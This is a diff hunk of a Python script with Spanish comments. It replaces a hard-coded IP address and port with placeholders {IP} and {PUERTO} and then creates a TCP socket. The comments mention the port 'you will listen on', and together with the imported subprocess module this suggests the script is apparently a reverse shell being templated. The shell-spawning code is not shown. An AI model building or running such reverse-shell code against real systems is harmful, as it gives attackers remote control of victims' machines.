@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # Configuración de la conexión
-ip = "192.168.56.105"  # Cambia por tu IP
-port = 433  # Cambia por el puerto que escucharás
+ip = "{IP}"  # Cambia por tu IP
+port = {PUERTO} # Cambia por el puerto que escucharás
 
 # Crear el socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
